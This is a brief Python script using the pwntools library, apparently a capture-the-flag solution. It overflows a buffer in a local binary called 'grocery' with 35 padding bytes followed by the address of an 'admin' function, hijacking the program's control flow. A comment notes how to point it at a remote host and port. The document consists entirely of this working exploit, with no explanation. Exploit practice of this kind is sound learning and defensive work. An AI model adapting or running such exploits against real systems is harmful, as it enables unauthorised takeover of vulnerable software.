from pwn import *
from time import sleep

elf=ELF("grocery")

p=elf.process() # remote(host,port)

print(p.recv())

payload=b'A'*35+p64(elf.symbols['admin'])

p.sendline(payload)

print(p.recv())